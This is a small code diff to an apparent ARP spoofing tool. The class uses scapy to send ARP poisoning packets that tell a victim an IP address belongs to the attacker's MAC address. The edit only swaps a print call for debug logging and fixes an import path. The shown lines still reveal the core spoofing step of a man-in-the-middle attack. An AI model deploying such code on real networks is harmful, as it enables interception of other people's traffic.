@@ -1,6 +1,7 @@
+import logging
 from scapy.all import ARP, Ether, sendp
 from time import sleep
-from service import Service
+from services.service import Service
 
 class ARPService(Service):
     def start(self):
@@ -20,4 +21,4 @@ class ARPService(Service):
 
         # Send the ARP poisoning
         sendp(arp, iface = self.config.iface, verbose=False)
-        print("[ARP] Sent to {} : {} is-at {}".format(victim.getMAC(), ipToSpoof, self.config.attacker.getMAC()))
+        logging.debug("[ARP] Sent to {} : {} is-at {}".format(victim.getMAC(), ipToSpoof, self.config.attacker.getMAC()))
